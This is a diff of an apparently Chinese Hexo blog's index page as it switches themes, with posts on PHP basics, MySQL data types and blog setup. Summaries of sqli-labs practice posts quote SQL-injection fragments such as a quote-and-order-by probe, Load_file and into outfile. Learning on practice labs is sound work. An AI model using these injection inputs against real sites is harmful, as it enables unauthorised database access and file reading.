+        <div class="layer" data-depth="0.4">
+            <img src="/img/welcome-cover.jpg" id="cover" crossorigin="anonymous" width="1920" height="1080">
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/10/PHP2/" data-id="ckr3hbgs6000y4cvo88et65g9" data-title="PHP2" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sqli-labs/mysql2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/08/sqli-labs/mysql2/" class="article-date">
-  <time class="dt-published" datetime="2020-11-08T03:20:21.000Z" itemprop="datePublished">2020-11-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/08/sqli-labs/mysql2/">mysql2</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h4><table>
-<thead>
-<tr>
-<th>类型</th>
-<th align="right">大小</th>
-<th align="center">用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>tinyint</td>
-<td align="right">1字节</td>
-<td align="center">小整数值</td>
-</tr>
-<tr>
-<td>smallint</td>
-<td align="right">2</td>
-<td align="center">大整数值</td>
-</tr>
-<tr>
-<td>mediumint</td>
-<td align="right">3</td>
-<td align="center">大整数值</td>
-</tr>
-<tr>
-<td>int</td>
-<td align="right">4</td>
-<td align="center">大整数值</td>
-</tr>
-<tr>
-<td>bigint</td>
-<td align="right">8</td>
-<td align="center">极大整数值</td>
-</tr>
-<tr>
-<td>float</td>
-<td align="right">4</td>
-<td align="center">单精度浮点数值</td>
-</tr>
-<tr>
-<td>double</td>
-<td align="right">8</td>
-<td align="center">双精度浮点数值</td>
-</tr>
-</tbody></table>
-<h4 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h4><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>格式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>date</td>
-<td>YYYY-MM-DD</td>
-</tr>
-<tr>
-<td>time</td>
-<td>xx：xx：xx</td>
-</tr>
-<tr>
-<td>year</td>
-<td>xxx</td>
-</tr>
-</tbody></table>
-<h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>char</td>
-<td>定长字符串</td>
-</tr>
-<tr>
-<td>varchar</td>
-<td>变长字符串</td>
-</tr>
-<tr>
-<td>text</td>
-<td>长文本数据</td>
-</tr>
-</tbody></table>
-
-      
+    <div id="vibrant">
+        <svg viewBox="0 0 2880 1620" height="100%" preserveAspectRatio="xMaxYMax slice">
+            <polygon opacity="0.7" points="2000,1620 0,1620 0,0 600,0 "/>
+        </svg>
+        <div></div>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/08/sqli-labs/mysql2/" data-id="ckr3hbgta002w4cvo68952u5l" data-title="mysql2" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-PHP" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/06/PHP/" class="article-date">
-  <time class="dt-published" datetime="2020-11-06T15:01:56.000Z" itemprop="datePublished">2020-11-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/06/PHP/">PHP基础</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="基本的PHP语法"><a href="#基本的PHP语法" class="headerlink" title="基本的PHP语法"></a>基本的PHP语法</h3><?php
-// PHP代码
-?>
-
-
-<h4 id="PHP中的注释"><a href="#PHP中的注释" class="headerlink" title="PHP中的注释"></a>PHP中的注释</h4><pre><code>  (与c语言相同)
-</code></pre>
-<h4 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h4><?php
-$x=5;
-$y=6;
-$z=$x+$y;
-echo $z;
-?>
-
-
-<h4 id="echo和print语句（注意这里的print与c语言的不同）"><a href="#echo和print语句（注意这里的print与c语言的不同）" class="headerlink" title="echo和print语句（注意这里的print与c语言的不同）"></a>echo和print语句（注意这里的print与c语言的不同）</h4><pre><code>  区别：echo-可以输出一个或多个字符串(记得加“ ”)
-            print-只允许输出一个字符串，返回值总为1
-</code></pre>
-<p>**echo输出速度比print快，echo没有返回值，print返回值为1.<br>   echo/print 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()</p>
-<h4 id="PHP-EOF-heredoc-使用说明"><a href="#PHP-EOF-heredoc-使用说明" class="headerlink" title="PHP EOF(heredoc) 使用说明"></a>PHP EOF(heredoc) 使用说明</h4><pre><code> A.必须后接分号，否则编译通不过。
- B.EOF可以用其他任意字符代替，只需保证结束标识与开始标识一致。
- C.##结束标识必须顶格独自占一行（即必须从行首开始，前后不能衔接任何空白和字符）。 
-</code></pre>
-<p>eg：<br><?php
-echo <<<EOF
-               <h1>我的第一个标题</h1>
-            <p>我的第一个段落。</p>
-EOF;
-?></p>
-<p>***开始标记和结束标记相同，比如常用大写的 EOT、EOD、EOF 来表示，但是不只限于那几个(也可以用：JSON、HTML等)，只要保证开始标记和结束标记不在正文中出现即可。<br>***变量不需要用连接符 . 或 , 来拼接<br>*例echo txt1”.“txt2;</p>
-<h4 id="PHP字符串"><a href="#PHP字符串" class="headerlink" title="PHP字符串"></a>PHP字符串</h4><pre><code>  你可以将任何文本放在单引号和双引号中
-</code></pre>
-<h4 id="PHP常量"><a href="#PHP常量" class="headerlink" title="PHP常量"></a>PHP常量</h4><pre><code> 常量是一个简单值的标识符。该值在脚本中不能改变。
- 一个常量由英文字母、下划线和数字组成，但数字不能作为首字母出现。
-</code></pre>
-<p>注意：##常量在整个脚本中都可以使用。</p>
-<h4 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h4><p>判断一个变量的类型与长度，并输出变量的数值，如果变量有值，则输出是变量的值，并返回数据类型。<br>显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p>
-<h4 id="PHP类型比较"><a href="#PHP类型比较" class="headerlink" title="PHP类型比较"></a>PHP类型比较</h4><p>松散比较：使用两个等号 == 比较，只比较值，不比较类型。<br>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</p>
-<h4 id="PHP字符串变量"><a href="#PHP字符串变量" class="headerlink" title="PHP字符串变量"></a>PHP字符串变量</h4><p>字符串变量用于包含有字符的值。<br>注释：当您赋一个文本值给变量时，请记得给文本值加上单引号或者双引号。</p>
-<h4 id="PHP-并置运算符"><a href="#PHP-并置运算符" class="headerlink" title="PHP 并置运算符"></a>PHP 并置运算符</h4><p>在 PHP 中，只有一个字符串运算符。<br>并置运算符 (.) 用于把两个字符串值连接起来。</p>
-<h4 id="PHP-strlen-函数"><a href="#PHP-strlen-函数" class="headerlink" title="PHP strlen() 函数"></a>PHP strlen() 函数</h4><p>有时知道字符串值的长度是很有用的。<br>strlen() 函数返回字符串的长度（字节数）。eg：echo strlen（）输出括号内的字符串长度</p>
-<h4 id="PHP-strpos-函数"><a href="#PHP-strpos-函数" class="headerlink" title="PHP strpos() 函数"></a>PHP strpos() 函数</h4><p>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。<br>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。<br>**提示：字符串中第一个字符的位置是 0，而不是 1。</p>
-
-      
+    <div id="header">
+        <div>
+            <a class="image-logo" href="/"></a>
+			
+            <div class="iconfont icon-menu switchmenu"></div>
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/06/PHP/" data-id="ckr3hbgs6000w4cvo0pk6g628" data-title="PHP基础" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-博客美化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/" class="article-date">
-  <time class="dt-published" datetime="2020-11-06T13:06:11.000Z" itemprop="datePublished">2020-11-06</time>
-</a>
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/">博客优化</a>
-    </h1>
-  
+    <div id="post0">
+        <p>十一月 22, 2020</p>
+        <h2><a href="/2020/11/22/sqli-labs/7/" title="sqli-labs7" class="posttitle">sqli-labs7</a></h2>
+        <p class="summary">Mysql文件读写涉及一个配置项secure_file_priv=
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h4 id="博客主题"><a href="#博客主题" class="headerlink" title="博客主题"></a>博客主题</h4><p>—第一步：git clone <a target="_blank" rel="noopener" href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a> themes/next 运行下载主题</p>
-<p>—第二步：打开设置站点的_config.yml(注意区分站点和主题文件位置)，找到theme，改成theme：next；</p>
-<h4 id="博客内容的编写"><a href="#博客内容的编写" class="headerlink" title="博客内容的编写"></a>博客内容的编写</h4><p>—-运行命令   hexo new page<br>       在source-_posts内找到page.md打开在记事本编辑即可</p>
-<h4 id="博客网站更名、语言、作者"><a href="#博客网站更名、语言、作者" class="headerlink" title="博客网站更名、语言、作者"></a>博客网站更名、语言、作者</h4><p>—-打开_config.yml 找到 title：xxx</p>
-<p>—-同样找到  language：zh-CN # 即可改为中文 </p>
-<p>—-author：xxx</p>
-
-      
+文件读取函数：Load_file(‘文件路径...</p>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/" data-id="ckr3hbgss00214cvof19l5m4n" data-title="博客优化" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-  <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
-  </nav>
+</div>
 
-</section>
+    <div id="primary">
         
-          <aside id="sidebar">
-  
-    
+<div class="post">
+    <a href="/2020/11/22/sqli-labs/7/" title="sqli-labs7">
+        <img src="/img/welcome-cover.jpg" class="cover" width="680" height="440">
+    </a>
+    <div class="else">
+        <p>十一月 22, 2020</p>
+        <h3><a href="/2020/11/22/sqli-labs/7/" title="sqli-labs7" class="posttitle">sqli-labs7</a></h3>
+        <p>Mysql文件读写涉及一个配置项secure_file_priv=
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWAsql%E6%B3%A8%E5%85%A5%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">DVWAsql注入和文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">PHP伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cs%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/" rel="tag">cs简单利用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/" rel="tag">kali网络配置问题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" rel="tag">msf简单使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="tag">一句话木马</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a></li></ul>
+文件读取函数：Load_file(‘文件路径’)
+写文件函数：into outfil...</p>
     </div>
-  </div>
+</div>
 
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/DVWAsql%E6%B3%A8%E5%85%A5%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">DVWAsql注入和文件上传</a> <a href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">PHP伪协议</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 20px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/cs%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/" style="font-size: 10px;">cs简单利用</a> <a href="/tags/kali%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/" style="font-size: 10px;">kali网络配置问题</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/msf%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">msf简单使用</a> <a href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">一句话木马</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 10px;">攻防世界</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 15px;">文件上传</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 12.5px;">暴力破解</a>
+<div class="post">
+    <a href="/2020/11/19/sqli-labs/5~6/" title="sqli-labs5、6">
+        <img src="/img/cover.jpg" class="cover" width="680" height="440">
+    </a>
+    <div class="else">
+        <p>十一月 19, 2020</p>
+        <h3><a href="/2020/11/19/sqli-labs/5~6/" title="sqli-labs5、6" class="posttitle">sqli-labs5、6</a></h3>
+        <p>
+导入：源码中有 print_f(mysql_error())报错注入型  输入?id=1到17页面显示正常 大于18 页面显示异常，得出没有页面没有显示...</p>
     </div>
-  </div>
+</div>
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+
+<div class="post">
+    <a href="/2020/11/19/sqli-labs/%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" title="双查询注入">
+        <img src="/img/cover.jpg" class="cover" width="680" height="440">
+    </a>
+    <div class="else">
+        <p>十一月 19, 2020</p>
+        <h3><a href="/2020/11/19/sqli-labs/%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" title="双查询注入" class="posttitle">双查询注入</a></h3>
+        <p>双查询注入了解floor，rand语句 select concat(&#39;x&#39;,&#39;y&#39;);`可用于连接x，y得xy
+
+字符记得...</p>
     </div>
-  </div>
+</div>
 
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2021/07/08/buu4/">buu4</a>
-          </li>
-        
-          <li>
-            <a href="/2021/06/02/CTF-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/">CTF-SQL注入进阶</a>
-          </li>
-        
-          <li>
-            <a href="/2021/06/01/CTF-%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80/">CTF-脚本基础</a>
-          </li>
-        
-          <li>
-            <a href="/2021/05/30/CTF-PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8/">CTF-PHP序列化安全</a>
-          </li>
-        
-          <li>
-            <a href="/2021/05/29/CTF-XXE%E6%B3%A8%E5%85%A5/">CTF-XXE注入</a>
-          </li>
-        
-      </ul>
+<div class="post">
+    <a href="/2020/11/17/sqli-labs/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="MYSQL注入相关学习">
+        <img src="/img/cover.jpg" class="cover" width="680" height="440">
+    </a>
+    <div class="else">
+        <p>十一月 17, 2020</p>
+        <h3><a href="/2020/11/17/sqli-labs/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="MYSQL注入相关学习" class="posttitle">MYSQL注入相关学习</a></h3>
+        <p>与MySQL相关知识点MySQL默认存放一个“information_schema”的数据库
+记住三个表名“schemata、tables、columns...</p>
     </div>
-  </div>
+</div>
 
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2021 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+
+<div class="post">
+    <a href="/2020/11/12/sqli-labs/1~4/" title="sqli-labs1">
+        <img src="/img/welcome-cover.jpg" class="cover" width="680" height="440">
+    </a>
+    <div class="else">
+        <p>十一月 12, 2020</p>
+        <h3><a href="/2020/11/12/sqli-labs/1~4/" title="sqli-labs1" class="posttitle">sqli-labs1</a></h3>
+        <p>联合查询Less-1首先判断注入点的类型只有单引号出现报错，单引号为注入点。?id=1&#39;
+判断列数?id=1&#39;order by 4--+(...</p>
     </div>
-  </div>
-</footer>
+</div>
+
+
+<div class="post">
+    <a href="/2020/11/11/sqli-labs/mysql3/" title="mysql3">
+        <img src="/img/cover.jpg" class="cover" width="680" height="440">
+    </a>
+    <div class="else">
+        <p>十一月 11, 2020</p>
+        <h3><a href="/2020/11/11/sqli-labs/mysql3/" title="mysql3" class="posttitle">mysql3</a></h3>
+        <p>mysql插入数据insert into 表名(名称1，-，-)values(插入的数据);
+mysql读取数据select * from 数据表名或se...</p>
+    </div>
+</div>
+
+
+<div class="post">
+    <a href="/2020/11/10/PHP2/" title="PHP2">
+        <img src="/img/cover.jpg" class="cover" width="680" height="440">
+    </a>
+    <div class="else">
+        <p>十一月 10, 2020</p>
+        <h3><a href="/2020/11/10/PHP2/" title="PHP2" class="posttitle">PHP2</a></h3>
+        <p>for循环for （初始值；条件；增量）{要执行的代码}eg：1+2+。。+100值for （$i=0;$i&lt;=100;$i++）&#123;$su...</p>
+    </div>
+</div>
+
+
+<div class="post">
+    <a href="/2020/11/08/sqli-labs/mysql2/" title="mysql2">
+        <img src="/img/welcome-cover.jpg" class="cover" width="680" height="440">
+    </a>
+    <div class="else">
+        <p>十一月 08, 2020</p>
+        <h3><a href="/2020/11/08/sqli-labs/mysql2/" title="mysql2" class="posttitle">mysql2</a></h3>
+        <p>数据类型数值类型
+
+
+类型
+大小
+用途
+
+
+
+tinyint
+1字节
+小整数值
+
+
+smallint
+2
+大整数值
+
+
+mediumint
+3
+大整数值
+...</p>
+    </div>
+</div>
+
+
+<div class="post">
+    <a href="/2020/11/06/PHP/" title="PHP基础">
+        <img src="/img/cover.jpg" class="cover" width="680" height="440">
+    </a>
+    <div class="else">
+        <p>十一月 06, 2020</p>
+        <h3><a href="/2020/11/06/PHP/" title="PHP基础" class="posttitle">PHP基础</a></h3>
+        <p>基本的PHP语法
+
+
+PHP中的注释  (与c语言相同)
+
+PHP变量
+
+
+echo和print语句（注意这里的print与c语言的不同）  区别：ech...</p>
+    </div>
+</div>
+
+
+<div class="post">
+    <a href="/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/" title="博客优化">
+        <img src="/img/cover.jpg" class="cover" width="680" height="440">
+    </a>
+    <div class="else">
+        <p>十一月 06, 2020</p>
+        <h3><a href="/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/" title="博客优化" class="posttitle">博客优化</a></h3>
+        <p>博客主题—第一步：git clone https://github.com/theme-next/hexo-theme-next themes/next ...</p>
+    </div>
+</div>
+
 
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
     
-
-
-<script src="/js/jquery-3.4.1.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <div id="pager"><a href="/page/7/" class="more">加载更多</a></div>
+    
+</div>
+<div id="preview"></div>
 
 
 
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
 </body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
 </html>
